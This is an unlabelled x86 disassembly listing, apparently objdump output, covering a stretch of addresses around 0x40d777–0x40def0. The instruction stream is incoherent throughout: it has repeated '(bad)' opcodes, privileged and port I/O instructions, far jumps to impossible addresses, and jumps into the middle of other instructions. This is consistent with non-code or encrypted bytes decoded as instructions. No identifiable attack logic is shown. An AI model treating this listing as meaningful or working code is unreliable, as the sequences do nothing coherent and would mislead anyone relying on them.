  40d777:	mov    DWORD PTR [eax+0x7427a70e],edi
  40d77d:	mov    ebx,DWORD PTR [ebx+0x1fba5eec]
  40d783:	ret    
  40d784:	outs   dx,DWORD PTR ds:[esi]
  40d785:	cmc    
  40d786:	cmp    BYTE PTR [edi-0x6f],dh
  40d789:	gs pop ebx
  40d78b:	fisttp WORD PTR [ebx]
  40d78d:	lock jnp 0x40d71a
  40d790:	sar    ch,cl
  40d792:	lods   al,BYTE PTR ds:[esi]
  40d793:	push   0x73b88d64
  40d798:	push   cs
  40d799:	sbb    al,0x95
  40d79b:	fcmove st,st(5)
  40d79d:	pop    eax
  40d79e:	push   esi
  40d79f:	sahf   
  40d7a0:	inc    ebx
  40d7a1:	pop    ss
  40d7a2:	adc    eax,0x7455562e
  40d7a7:	jmp    0x5a3ea70d
  40d7ac:	mov    ecx,0x28b80287
  40d7b1:	sub    esp,DWORD PTR [ebx+0xe]
  40d7b4:	jge    0x40d766
  40d7b6:	sub    dh,BYTE PTR [ebx]
  40d7b8:	mov    al,0xcc
  40d7ba:	std    
  40d7bb:	sub    DWORD PTR [edx+0xd],eax
  40d7be:	popf   
  40d7bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7c0:	mov    cl,0xa3
  40d7c2:	pop    esi
  40d7c3:	pop    eax
  40d7c4:	xor    al,0xd9
  40d7c6:	inc    esp
  40d7c7:	xacquire xchg DWORD PTR [edx+0x41],esi
  40d7cb:	icebp  
  40d7cc:	es push edx
  40d7ce:	jmp    0xa12c6b52
  40d7d3:	cmp    ebx,DWORD PTR [ebp+0x35]
  40d7d6:	aam    0xc5
  40d7d8:	pop    ebx
  40d7d9:	(bad)  
  40d7da:	retf   
  40d7db:	rol    BYTE PTR [edx+0x52bc6ea7],cl
  40d7e1:	ret    0xa93c
  40d7e4:	imul   eax,DWORD PTR [edx+ecx*1-0x37],0x7b
  40d7e9:	scas   eax,DWORD PTR es:[edi]
  40d7ea:	out    0xd7,eax
  40d7ec:	jbe    0x40d867
  40d7ee:	mov    al,ds:0x44b9b917
  40d7f3:	aam    0xad
  40d7f5:	xor    BYTE PTR [edi-0x6483086e],dl
  40d7fb:	fild   QWORD PTR [edi]
  40d7fd:	ins    BYTE PTR es:[edi],dx
  40d7fe:	mov    edi,0x298d35da
  40d803:	addr16 lock pusha 
  40d806:	in     eax,0xe2
  40d808:	dec    eax
  40d809:	and    DWORD PTR [ecx],edx
  40d80b:	fwait
  40d80c:	shl    BYTE PTR [ebx],cl
  40d80e:	leave  
  40d80f:	adc    DWORD PTR [edi+0x60deeba2],ebx
  40d815:	pop    ebp
  40d816:	retf   
  40d817:	adc    BYTE PTR [ebp+0x2e],bl
  40d81a:	clc    
  40d81b:	pop    edi
  40d81c:	pop    ebp
  40d81d:	push   cs
  40d81e:	inc    edx
  40d81f:	mov    edi,0xf03cb519
  40d824:	mov    ds:0xebf60227,al
  40d829:	lds    ecx,FWORD PTR [ecx-0x77]
  40d82c:	enter  0xcd3a,0xd5
  40d830:	mov    ?,WORD PTR [ecx+edx*8-0x1c]
  40d834:	push   ss
  40d835:	cld    
  40d836:	(bad)  
  40d837:	das    
  40d838:	jmp    FWORD PTR [ebx+0x2e]
  40d83b:	xchg   edx,eax
  40d83c:	mov    ds:0xd77a2213,eax
  40d841:	and    eax,DWORD PTR [esi-0x49]
  40d844:	pop    edi
  40d845:	jno    0x40d877
  40d847:	push   esp
  40d848:	xchg   esp,eax
  40d849:	or     esp,DWORD PTR [ebp-0x1a]
  40d84c:	dec    ecx
  40d84d:	ins    DWORD PTR es:[edi],dx
  40d84e:	xor    BYTE PTR [eax-0x41503e58],al
  40d854:	add    ebp,DWORD PTR [ebp-0xadbe950]
  40d85a:	xor    al,0x26
  40d85c:	add    dh,BYTE PTR [ebx-0x44]
  40d85f:	(bad)  
  40d860:	jmp    0xbf0a5bd6
  40d865:	sub    ebx,edx
  40d867:	xchg   DWORD PTR [edx],ebp
  40d869:	sub    esp,DWORD PTR [eax+0x40]
  40d86c:	(bad)
  40d870:	xchg   ecx,eax
  40d871:	xor    DWORD PTR [eax],0x5e
  40d874:	sub    al,BYTE PTR [edi]
  40d876:	mov    eax,ds:0xeb99910a
  40d87b:	adc    edx,edi
  40d87d:	dec    edi
  40d87e:	test   BYTE PTR [ecx+ebx*8+0x6b],0x35
  40d883:	int3   
  40d884:	add    eax,0x64dad74f
  40d889:	call   ebx
  40d88b:	xor    ebx,ebx
  40d88d:	jmp    0x40d9eb
  40d892:	mul    BYTE PTR [ebx-0x6c]
  40d895:	jne    0x40d914
  40d897:	lds    edx,FWORD PTR [edi+0x51026b7d]
  40d89d:	mov    ebp,DWORD PTR [ecx-0x3def6483]
  40d8a3:	cmp    DWORD PTR [esi+0x7e],0x7e7e7f3f
  40d8aa:	lea    ebx,[ecx]
  40d8ac:	es push cs
  40d8ae:	repz lea esi,[esi]
  40d8b1:	ds out 0xfc,eax
  40d8b4:	and    ebx,DWORD PTR [ecx+0x79a12d]
  40d8ba:	rcr    DWORD PTR [ebx+0x3f],cl
  40d8bd:	jns    0x40d8df
  40d8bf:	jle    0x40d86d
  40d8c1:	jge    0x40d8c6
  40d8c3:	out    dx,al
  40d8c4:	shr    BYTE PTR [eax-0x3d],cl
  40d8c7:	ror    DWORD PTR [eax-0x47],0x3a
  40d8cb:	xchg   edi,eax
  40d8cc:	fbstp  TBYTE PTR [edx]
  40d8ce:	dec    ebx
  40d8cf:	push   ebx
  40d8d0:	cmp    eax,0xb73cdf6f
  40d8d5:	cmp    esi,ebp
  40d8d7:	das    
  40d8d8:	xor    eax,DWORD PTR [edi]
  40d8da:	dec    esi
  40d8db:	call   0xf5cc:0xd212fb12
  40d8e2:	sub    eax,0x6e17b221
  40d8e7:	(bad)  
  40d8e8:	sbb    al,0x5a
  40d8ea:	inc    esp
  40d8eb:	into   
  40d8ec:	fsubr  st(4),st
  40d8ee:	rcl    BYTE PTR [ebp+eiz*2+0x2c0adcd6],1
  40d8f5:	retf   0xda19
  40d8f8:	push   esp
  40d8f9:	mov    ecx,esp
  40d8fb:	out    dx,eax
  40d8fc:	(bad)  
  40d8fe:	xchg   ecx,eax
  40d8ff:	cli    
  40d900:	dec    ebx
  40d901:	jge    0x40d883
  40d903:	xchg   edx,eax
  40d904:	xor    DWORD PTR [ecx],ebx
  40d906:	in     al,0x90
  40d908:	fimul  DWORD PTR [edx+0x78]
  40d90b:	(bad)  
  40d90c:	pop    ss
  40d90d:	ret    0x7ebe
  40d910:	or     edx,DWORD PTR [edx]
  40d912:	add    DWORD PTR [ecx],edi
  40d914:	iret   
  40d915:	aad    0xf9
  40d917:	lods   eax,DWORD PTR ds:[esi]
  40d918:	icebp  
  40d919:	scas   eax,DWORD PTR es:[edi]
  40d91a:	rcl    DWORD PTR [edi],0xe6
  40d91d:	adc    BYTE PTR [ebx],bl
  40d91f:	dec    edi
  40d920:	push   edi
  40d921:	jl     0x40d915
  40d923:	cdq    
  40d924:	cld    
  40d925:	mov    ch,0x2f
  40d927:	pop    edi
  40d928:	cmp    ah,BYTE PTR [edx+0x498a5706]
  40d92e:	push   ds
  40d92f:	cli    
  40d930:	dec    esi
  40d931:	mov    ch,0x2a
  40d933:	test   BYTE PTR [esi-0x1d],al
  40d936:	test   bl,cl
  40d938:	loope  0x40d990
  40d93a:	mov    ecx,0x2477e1c6
  40d93f:	call   0x7552c6f2
  40d944:	rcl    DWORD PTR [ebp+edi*8-0x27],0xad
  40d949:	scas   al,BYTE PTR es:[edi]
  40d94a:	dec    ecx
  40d94b:	dec    esi
  40d94c:	test   al,0x95
  40d94e:	je     0x40d947
  40d950:	mov    ecx,0x4c357726
  40d955:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d956:	sub    al,0xaf
  40d958:	dec    edx
  40d959:	ja     0x40d9da
  40d95b:	mov    al,0x5e
  40d95d:	xchg   ebx,eax
  40d95e:	cmp    al,0x1f
  40d960:	xlat   BYTE PTR ds:[ebx]
  40d961:	(bad)  
  40d962:	fcomp  st(7)
  40d964:	daa    
  40d965:	and    ebx,DWORD PTR [edi+ecx*2-0x44b2d723]
  40d96c:	adc    dl,BYTE PTR [edi-0x7f]
  40d96f:	test   BYTE PTR [eax-0x23],0x3f
  40d973:	loope  0x40d995
  40d975:	dec    edx
  40d976:	push   esi
  40d977:	dec    edi
  40d978:	mov    ebp,0x3b2f7679
  40d97d:	outs   dx,BYTE PTR ds:[esi]
  40d97e:	mov    ebx,0xeece5a3a
  40d983:	sub    eax,0xc0d053b1
  40d988:	lods   eax,DWORD PTR ds:[esi]
  40d989:	pusha  
  40d98a:	dec    edi
  40d98b:	repnz pop esi
  40d98d:	or     DWORD PTR [ebp-0x2f77f95c],esp
  40d993:	jo     0x40d9b4
  40d995:	push   edi
  40d996:	std    
  40d997:	and    BYTE PTR [edi-0x74],bh
  40d99a:	xor    ebp,DWORD PTR [ebx-0xabc13af]
  40d9a0:	imul   esi,ecx,0xffffff88
  40d9a3:	fldcw  WORD PTR [ecx-0x2126a127]
  40d9a9:	aad    0xfe
  40d9ab:	mov    al,0x44
  40d9ad:	xchg   DWORD PTR [eax],ecx
  40d9af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9b0:	hlt    
  40d9b1:	adc    DWORD PTR [eax],eax
  40d9b3:	leave  
  40d9b4:	lea    eax,[ebx+0x7094f9cf]
  40d9ba:	xor    BYTE PTR [edx+0x3da490a1],0x68
  40d9c1:	mov    eax,ds:0xb4372b44
  40d9c6:	push   ecx
  40d9c7:	mov    ecx,DWORD PTR [ebp+0x2a]
  40d9ca:	xor    BYTE PTR [eax-0x58],ch
  40d9cd:	idiv   BYTE PTR [ecx-0xc]
  40d9d0:	test   BYTE PTR [eax+0x3e9697ab],ch
  40d9d6:	or     eax,0x4a27dfa9
  40d9db:	cmp    BYTE PTR [ebp-0x7e],ah
  40d9de:	into   
  40d9df:	in     eax,0x52
  40d9e1:	pop    esp
  40d9e2:	sub    al,BYTE PTR [esi+0x62af0dc1]
  40d9e8:	in     eax,0xdc
  40d9ea:	jle    0x40da2f
  40d9ec:	jmp    0x40db4a
  40d9f1:	jae    0x40d9e7
  40d9f3:	aas    
  40d9f4:	mov    DWORD PTR [ecx-0x6573b2b3],esi
  40d9fa:	cmp    BYTE PTR [edx+0x77],bl
  40d9fd:	push   bx
  40d9ff:	bound  ebx,QWORD PTR [ebx+eax*4+0x3f7e7e82]
  40da06:	jg     0x40da86
  40da08:	jle    0x40da2d
  40da0a:	ja     0x40da3a
  40da0c:	call   0x41114544
  40da11:	out    0xd2,eax
  40da13:	aam    0xdb
  40da15:	imul   DWORD PTR [edi]
  40da17:	aad    0x17
  40da19:	cmp    ebp,ecx
  40da1b:	stos   DWORD PTR es:[edi],eax
  40da1c:	lods   eax,DWORD PTR ds:[esi]
  40da1d:	aas    
  40da1e:	addr16 xchg edx,eax
  40da20:	jno    0x40d9e8
  40da22:	pop    edi
  40da23:	jno    0x40da53
  40da25:	or     DWORD PTR [eax+0x4a],esi
  40da28:	je     0x40d9cb
  40da2a:	into   
  40da2b:	add    esp,DWORD PTR [ecx+0x16]
  40da2e:	stos   DWORD PTR es:[edi],eax
  40da2f:	sub    eax,0x731ee36e
  40da34:	sbb    DWORD PTR [esp+ebx*4-0x3],edx
  40da38:	xor    dh,BYTE PTR [esi+ecx*4]
  40da3b:	arpl   WORD PTR [edx-0x6e],si
  40da3e:	push   ds
  40da3f:	push   eax
  40da40:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da42:	pop    esi
  40da43:	test   BYTE PTR [esi-0x2b185c47],ah
  40da49:	(bad)  
  40da4a:	not    BYTE PTR [ebp+0x42bace27]
  40da50:	call   0x5d498e9d
  40da55:	jb     0x40da98
  40da57:	add    al,0x7a
  40da59:	cmp    edx,DWORD PTR ds:0xda73baef
  40da5f:	or     ch,BYTE PTR es:[ebp+0x46ebc086]
  40da66:	in     eax,dx
  40da67:	adc    al,0x8b
  40da69:	sbb    al,0x94
  40da6b:	mov    ecx,DWORD PTR [edi-0xa]
  40da6e:	xor    al,0x3f
  40da70:	dec    edx
  40da71:	icebp  
  40da72:	pop    edx
  40da73:	inc    ebp
  40da74:	push   0x62
  40da76:	int    0xa8
  40da78:	add    cl,bl
  40da7a:	sbb    al,0x94
  40da7c:	pop    ebp
  40da7d:	imul   esi,DWORD PTR ds:0x7993749e,0x3eb3bc14
  40da87:	test   al,0xe1
  40da89:	pop    ebp
  40da8a:	inc    ebp
  40da8b:	fwait
  40da8c:	sub    DWORD PTR [esi],edi
  40da8e:	mov    ds:0x5528ccc5,eax
  40da93:	pop    edx
  40da94:	push   eax
  40da95:	icebp  
  40da96:	xchg   edx,eax
  40da97:	cmp    al,ch
  40da99:	adc    al,0xa7
  40da9b:	cmp    bh,bh
  40da9d:	adc    edi,ecx
  40da9f:	and    ebx,DWORD PTR [ebx+eiz*4+0x133dcf0c]
  40daa6:	mov    eax,0x2223bcde
  40daab:	jbe    0x40daef
  40daad:	sbb    ah,BYTE PTR [ecx-0x7f]
  40dab0:	mov    bh,0x47
  40dab2:	dec    ebx
  40dab3:	or     eax,0x2b7bd110
  40dab8:	sub    BYTE PTR [eax],bh
  40daba:	mov    ebp,0x1b9f3603
  40dabf:	lods   al,BYTE PTR ds:[esi]
  40dac0:	or     al,0x75
  40dac2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dac3:	xor    DWORD PTR [eax-0x30],esp
  40dac6:	and    al,BYTE PTR [esi+esi*8+0x3b]
  40daca:	pop    edx
  40dacb:	dec    edi
  40dacc:	cmp    cl,0x29
  40dacf:	xchg   edi,eax
  40dad0:	imul   edi,DWORD PTR [edx+0x67],0xffffff90
  40dad4:	jb     0x40da60
  40dad6:	test   BYTE PTR [edx],dl
  40dad8:	cmp    edi,edi
  40dada:	and    al,ch
  40dadc:	mov    al,ds:0xf8c9cd8e
  40dae1:	sub    al,0xdb
  40dae3:	scas   al,BYTE PTR es:[edi]
  40dae4:	push   0x7e12957a
  40dae9:	jmp    0x953:0xaa6980d2
  40daf0:	dec    ebx
  40daf1:	sbb    BYTE PTR [esi-0x3b],ah
  40daf4:	clc    
  40daf5:	push   ebp
  40daf6:	imul   BYTE PTR [ebp+0x55]
  40daf9:	loopne 0x40dada
  40dafb:	adc    al,0xae
  40dafd:	mov    ds:0x21cdb881,eax
  40db02:	std    
  40db03:	or     ah,BYTE PTR [ebp+0x25]
  40db06:	shl    ebp,1
  40db08:	scas   eax,DWORD PTR es:[edi]
  40db09:	inc    ebx
  40db0a:	lock sub edi,DWORD PTR [edx]
  40db0d:	imul   eax,DWORD PTR [edx+eax*1],0xf0b293de
  40db14:	or     esi,edi
  40db16:	shr    BYTE PTR [ebx],1
  40db18:	jae    0x40db3a
  40db1a:	enter  0x3987,0x24
  40db1e:	mov    esp,0x43dd56f2
  40db23:	scas   al,BYTE PTR es:[edi]
  40db24:	cmp    ebx,DWORD PTR [ebp+0x4]
  40db27:	and    al,0xc6
  40db29:	mov    ah,BYTE PTR [esi]
  40db2b:	push   ss
  40db2c:	mov    bl,0xcb
  40db2e:	lea    edx,[esp+ecx*2-0x38]
  40db32:	inc    esi
  40db33:	ret    
  40db34:	xor    al,0x94
  40db36:	jmp    0x40db50
  40db38:	and    eax,0x453b130c
  40db3d:	mov    ebp,0xd7e5b2b
  40db42:	xchg   esi,eax
  40db43:	scas   al,BYTE PTR es:[edi]
  40db44:	and    edi,edi
  40db46:	addr16 dec ebp
  40db48:	pop    ss
  40db49:	sbb    DWORD PTR [ecx],edi
  40db4b:	pop    ebp
  40db4c:	adc    BYTE PTR [edi],cl
  40db4e:	test   BYTE PTR [edx],dh
  40db50:	add    al,0x0
  40db52:	add    cl,ch
  40db54:	pop    ecx
  40db55:	add    DWORD PTR [eax],eax
  40db57:	add    BYTE PTR [ebp-0x54e36178],dl
  40db5d:	cmp    al,0xbd
  40db5f:	mov    ecx,0xd105ab5
  40db64:	add    al,0xa1
  40db66:	mov    WORD PTR [ecx],es
  40db68:	inc    esp
  40db69:	cmp    DWORD PTR [esi+0x7e],0x3f
  40db6d:	jg     0x40dbed
  40db6f:	jle    0x40dbc0
  40db71:	dec    ecx
  40db72:	sti    
  40db73:	xchg   edi,eax
  40db74:	mov    ch,0x3b
  40db76:	or     ch,BYTE PTR ds:0x47893374
  40db7c:	adc    eax,0x923a50f0
  40db81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db82:	mov    ds:0x7b612e04,al
  40db87:	(bad)  
  40db88:	lods   eax,DWORD PTR ds:[esi]
  40db89:	adc    DWORD PTR [ecx+0x192ddbfd],esi
  40db8f:	pop    es
  40db90:	pop    eax
  40db91:	loope  0x40dbbd
  40db93:	mov    eax,0x6b3db942
  40db98:	mov    ah,0x0
  40db9a:	and    DWORD PTR [esi-0x71be6ba5],ebp
  40dba0:	sub    DWORD PTR [edx+eax*8],eax
  40dba3:	shr    DWORD PTR [edi+0x3e12ac10],1
  40dba9:	xor    BYTE PTR [ecx+0x2e],dl
  40dbac:	ret    0x7663
  40dbaf:	mov    bl,0xaa
  40dbb1:	add    BYTE PTR [eax+0x69],0xc8
  40dbb5:	bsr    ecx,DWORD PTR [ecx-0x51]
  40dbb9:	into   
  40dbba:	lds    eax,FWORD PTR [ebp-0x1e748a02]
  40dbc0:	pop    ebp
  40dbc1:	cmp    al,cl
  40dbc3:	retf   0xbf3c
  40dbc6:	fstp   TBYTE PTR [ebx-0x47]
  40dbc9:	bound  esi,QWORD PTR [esi-0x49]
  40dbcc:	gs test al,0x58
  40dbcf:	test   al,0xd2
  40dbd1:	sbb    DWORD PTR [esi+edi*8-0x45],ecx
  40dbd5:	imul   esp,edx,0x645d87fd
  40dbdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dbdc:	mov    DWORD PTR [edi],ecx
  40dbde:	mov    eax,ds:0xacc0bc8d
  40dbe3:	xlat   BYTE PTR ds:[ebx]
  40dbe4:	je     0x40dc2b
  40dbe6:	pop    edx
  40dbe7:	out    0x75,al
  40dbe9:	out    0x30,al
  40dbeb:	pushf  
  40dbec:	inc    ebx
  40dbed:	bnd jo 0x40dba2
  40dbf0:	(bad)  
  40dbf1:	clc    
  40dbf2:	xchg   ebx,eax
  40dbf3:	sbb    edi,DWORD PTR [ecx-0x54]
  40dbf6:	push   ebp
  40dbf7:	addr16 mov eax,ds:0x1095
  40dbfb:	adc    cl,BYTE PTR [ebx-0x5b]
  40dbfe:	sub    al,0x5
  40dc00:	(bad)  
  40dc01:	cmp    BYTE PTR [ecx],ch
  40dc03:	loope  0x40dba9
  40dc05:	mov    WORD PTR [ecx+0xd],es
  40dc08:	adc    DWORD PTR [ecx],0x5bac8bb7
  40dc0e:	sub    eax,0xabff2afc
  40dc13:	fisttp WORD PTR ds:0xcfbba7fc
  40dc19:	xchg   edi,eax
  40dc1a:	div    DWORD PTR [edx-0x2]
  40dc1d:	ret    0x366e
  40dc20:	into   
  40dc21:	jp     0x40dc33
  40dc23:	call   0x4c6e0033
  40dc28:	push   edi
  40dc29:	push   ss
  40dc2a:	and    al,0x2c
  40dc2c:	mov    al,ds:0xaefdded4
  40dc31:	adc    DWORD PTR [edx-0x28],edx
  40dc34:	mov    esi,0x8fa8f71e
  40dc39:	je     0x40dc20
  40dc3b:	ins    BYTE PTR es:[edi],dx
  40dc3c:	scas   al,BYTE PTR es:[edi]
  40dc3d:	mov    cl,0xcc
  40dc3f:	jne    0x40dc26
  40dc41:	loope  0x40dbe6
  40dc43:	add    al,0x4f
  40dc45:	adc    BYTE PTR [edi+0x4e77fd30],0xdd
  40dc4c:	loope  0x40dc12
  40dc4e:	mov    bl,0x4
  40dc50:	and    BYTE PTR [ecx+ebp*2+0x7444f665],cl
  40dc57:	js     0x40dc39
  40dc59:	mov    esi,0x6eb659
  40dc5e:	repnz int3 
  40dc60:	push   ecx
  40dc61:	mov    ah,0x5c
  40dc63:	push   0x28
  40dc65:	jmp    0x40dc9f
  40dc67:	xor    dl,BYTE PTR [edi-0x389171aa]
  40dc6d:	mov    bh,0x76
  40dc6f:	mov    bl,0x74
  40dc71:	push   cs
  40dc72:	popf   
  40dc73:	leave  
  40dc74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc75:	faddp  st(2),st
  40dc77:	xchg   DWORD PTR [edx+0x1a],eax
  40dc7a:	sbb    bl,BYTE PTR ds:0x1e2c7cd1
  40dc80:	push   ebx
  40dc81:	and    dl,cl
  40dc83:	add    dh,BYTE PTR ds:[ecx]
  40dc86:	xchg   edi,eax
  40dc87:	sub    BYTE PTR [edx],cl
  40dc89:	fadd   QWORD PTR [ebx+edi*8]
  40dc8c:	push   edi
  40dc8d:	inc    ebp
  40dc8e:	sbb    esi,esp
  40dc90:	fnstsw WORD PTR cs:[ecx+0x6972b9f6]
  40dc97:	jb     0x40dc99
  40dc99:	jnp    0x40dca6
  40dc9b:	mov    eax,0xaed1a734
  40dca0:	daa    
  40dca1:	add    DWORD PTR [ebp+ebp*1+0x2e],ebp
  40dca5:	arpl   WORD PTR [edx],dx
  40dca7:	add    eax,0x9bd026b2
  40dcac:	mov    edi,0x978d2e03
  40dcb1:	xchg   edx,eax
  40dcb2:	jmp    0x40de10
  40dcb7:	dec    eax
  40dcb8:	adc    eax,0xdc7bcafb
  40dcbd:	jns    0x40dc54
  40dcbf:	rcl    BYTE PTR ds:0x89823fe9,cl
  40dcc5:	mov    WORD PTR [eax+0x5],es
  40dcc8:	test   DWORD PTR [esi+0x7e],edi
  40dccb:	aas    
  40dccc:	jg     0x40dd4c
  40dcce:	jle    0x40dcc7
  40dcd0:	and    BYTE PTR [eax+0x58e89370],dh
  40dcd6:	fs scas eax,DWORD PTR es:[edi]
  40dcd8:	sbb    cl,dl
  40dcda:	data16 jl 0x40dd44
  40dcdd:	sti    
  40dcde:	sbb    eax,0x8c10af31
  40dce3:	iret   
  40dce4:	das    
  40dce5:	sti    
  40dce6:	xchg   DWORD PTR [ecx+0x592970dc],ebx
  40dcec:	mov    ecx,0x482bb29e
  40dcf1:	(bad)  
  40dcf2:	pushf  
  40dcf3:	popf   
  40dcf4:	ins    DWORD PTR es:[edi],dx
  40dcf5:	stc    
  40dcf6:	xor    eax,0xbaa14fc
  40dcfb:	sub    DWORD PTR [ebp+0x323a0609],ecx
  40dd01:	loope  0x40dcae
  40dd03:	(bad)  [ebx]
  40dd05:	lahf   
  40dd06:	mov    cs,WORD PTR [ecx+edi*4+0x5c]
  40dd0a:	and    al,0xde
  40dd0c:	xchg   cl,dh
  40dd0e:	iret   
  40dd0f:	cmc    
  40dd10:	mov    ebx,0x2a08c6af
  40dd15:	add    ecx,eax
  40dd17:	adc    edi,DWORD PTR [edx-0x14]
  40dd1a:	dec    eax
  40dd1b:	xchg   ecx,ebp
  40dd1d:	cs out 0x8f,eax
  40dd20:	rol    BYTE PTR ds:0x6805e694,0xa4
  40dd27:	out    0x6a,al
  40dd29:	mov    ah,al
  40dd2b:	popf   
  40dd2c:	clc    
  40dd2d:	fstp   QWORD PTR es:[eax+0x52]
  40dd31:	lock ins DWORD PTR es:[edi],dx
  40dd33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd34:	jae    0x40dd8c
  40dd36:	adc    al,0x35
  40dd38:	inc    esp
  40dd39:	in     al,dx
  40dd3a:	jmp    0x935727f5
  40dd3f:	inc    ecx
  40dd40:	jmp    0x1284:0x899d40fa
  40dd47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd48:	push   eax
  40dd49:	nop    DWORD PTR [edx]
  40dd4c:	dec    edx
  40dd4d:	popf   
  40dd4e:	test   al,0x8c
  40dd50:	sar    DWORD PTR [edi-0x2b17bcae],0x88
  40dd57:	xchg   ebx,eax
  40dd58:	imul   eax,DWORD PTR [ecx+0xd69b3f6],0x7cb2e9a
  40dd62:	das    
  40dd63:	xlat   BYTE PTR ds:[ebx]
  40dd64:	inc    ebx
  40dd65:	fs mov ah,0xe7
  40dd68:	fucomip st,st(5)
  40dd6a:	fucom  st(6)
  40dd6c:	sbb    al,0x7b
  40dd6e:	xor    al,0xf9
  40dd70:	xchg   BYTE PTR [ebp+0x29],al
  40dd73:	icebp  
  40dd74:	mov    ah,cl
  40dd76:	and    esp,ecx
  40dd78:	mov    eax,ds:0xea49e56b
  40dd7d:	pop    eax
  40dd7e:	xlat   BYTE PTR ds:[ebx]
  40dd7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd80:	(bad)  
  40dd81:	mov    ecx,0xa03486e1
  40dd86:	xor    eax,DWORD PTR [ecx+eiz*8-0x3b27d5f9]
  40dd8d:	fwait
  40dd8e:	out    dx,eax
  40dd8f:	sbb    ah,BYTE PTR [ebx]
  40dd91:	xchg   edi,eax
  40dd92:	std    
  40dd93:	jnp    0x40dd91
  40dd95:	sub    al,BYTE PTR [eax]
  40dd97:	mov    ds:0x588050ec,eax
  40dd9c:	or     DWORD PTR [ebx+0x2ebac503],eax
  40dda2:	and    esi,DWORD PTR [ebp+0x471db162]
  40dda8:	rcr    DWORD PTR [edi],0x13
  40ddab:	test   al,0x84
  40ddad:	imul   ecx,DWORD PTR [ecx-0x68],0x4d146f0d
  40ddb4:	std    
  40ddb5:	adc    BYTE PTR es:[ebp-0x7af1bfb7],0xab
  40ddbd:	push   esi
  40ddbe:	or     eax,0x3e9050
  40ddc3:	ret    0xf464
  40ddc6:	test   al,0x81
  40ddc8:	mov    bh,0x32
  40ddca:	addr16 xor esp,esi
  40ddcd:	mov    ebp,0xfaf9aef8
  40ddd2:	sub    BYTE PTR [esi],0x2f
  40ddd5:	jbe    0x40dda3
  40ddd7:	mov    ds:0x4bd7eb42,al
  40dddc:	xor    al,0xe7
  40ddde:	ror    DWORD PTR [esp+ebx*8-0x7994019],cl
  40dde5:	mov    gs,WORD PTR [eax]
  40dde7:	xor    ebx,DWORD PTR [ecx]
  40dde9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ddea:	je     0x40de40
  40ddec:	push   edi
  40dded:	or     al,0xce
  40ddef:	xor    eax,0xb058fcfd
  40ddf4:	gs neg ebp
  40ddf7:	xchg   ebx,eax
  40ddf8:	mov    bh,0x20
  40ddfa:	int    0x9c
  40ddfc:	pusha  
  40ddfd:	push   eax
  40ddfe:	mov    ?,edi
  40de00:	cmc    
  40de01:	in     al,0x9a
  40de03:	inc    esp
  40de04:	mov    edx,0x5a1efc58
  40de09:	ss sub dh,dl
  40de0c:	clc    
  40de0d:	lods   eax,DWORD PTR ds:[esi]
  40de0f:	add    DWORD PTR [edx+0xa],ebp
  40de12:	pop    ecx
  40de13:	push   0x4
  40de15:	pop    ebx
  40de16:	inc    ebx
  40de17:	xchg   ebx,ecx
  40de19:	jmp    0x40df77
  40de1e:	ss test al,0xe0
  40de21:	or     eax,0x6dfb5d60
  40de26:	mov    al,0x7d
  40de28:	jmp    0x3267d88d
  40de2d:	mov    BYTE PTR [bp+0x7e7e],0x3f
  40de33:	jg     0x40deb3
  40de35:	jle    0x40de62
  40de37:	jg     0x40dead
  40de39:	pop    ebp
  40de3a:	pop    ebx
  40de3b:	and    al,0x1e
  40de3d:	sti    
  40de3e:	sub    al,0x70
  40de40:	in     eax,0x90
  40de42:	pop    es
  40de43:	out    dx,al
  40de44:	rol    edx,0xf1
  40de47:	fcomi  st,st(4)
  40de49:	sub    al,0x5c
  40de4b:	sub    al,dl
  40de4d:	adc    DWORD PTR [ebx+0x6ef2b38b],edx
  40de53:	or     al,BYTE PTR [ecx-0x11d5f73d]
  40de59:	sub    BYTE PTR [eax+0x9651895],dl
  40de5f:	fcmove st,st(1)
  40de61:	inc    eax
  40de62:	sbb    eax,0x4cd05732
  40de67:	xchg   edi,eax
  40de68:	push   0x0
  40de6a:	mov    cl,0x51
  40de6c:	or     esp,ebp
  40de6e:	gs cmp al,0x38
  40de71:	in     eax,dx
  40de72:	sar    DWORD PTR [edi-0x3b919ee6],cl
  40de78:	hlt    
  40de79:	xchg   cl,cl
  40de7b:	push   cs
  40de7c:	cmp    ch,BYTE PTR [ebp+0x5f8b891f]
  40de82:	ret    
  40de83:	fwait
  40de84:	xchg   ebx,eax
  40de85:	(bad)  
  40de86:	mov    ebx,0x2ff655e1
  40de8b:	inc    edi
  40de8c:	hlt    
  40de8d:	popf   
  40de8e:	cmp    DWORD PTR [ebp+eax*8-0x4b],0x6974a01a
  40de96:	arpl   WORD PTR [ecx+eiz*1],dx
  40de99:	popf   
  40de9a:	sub    eax,0xfcfd245b
  40de9f:	mov    al,0x5f
  40dea1:	call   FWORD PTR [edi]
  40dea3:	mov    esp,0xa4e66d56
  40dea8:	aad    0x35
  40deaa:	sbb    ch,ch
  40deac:	mov    ebp,0x6b5ba398
  40deb1:	outs   dx,DWORD PTR ds:[esi]
  40deb2:	test   eax,0x1256855d
  40deb7:	fistp  QWORD PTR [esi+0x61120386]
  40debd:	retf   
  40debe:	jne    0x40de67
  40dec0:	mov    BYTE PTR [edx-0x3c0c0e56],cl
  40dec6:	rol    DWORD PTR [ebx],0x4e
  40dec9:	fst    QWORD PTR [ebx+edx*8-0x2a0b36eb]
  40ded0:	sub    al,0xbe
  40ded2:	aaa    
  40ded3:	add    al,0x4f
  40ded5:	int3   
  40ded6:	add    al,0x10
  40ded8:	retf   0x7d5b
  40dedb:	(bad)  
  40dedc:	idiv   DWORD PTR [ebx+0x5]
  40dedf:	and    dh,BYTE PTR [ebp+0x61f318ca]
  40dee5:	in     al,0x4d
  40dee7:	lea    edx,[ebx-0x4cb0e674]
  40deed:	push   eax
  40deee:	jo     0x40dee5
  40def0:	in     al,dx
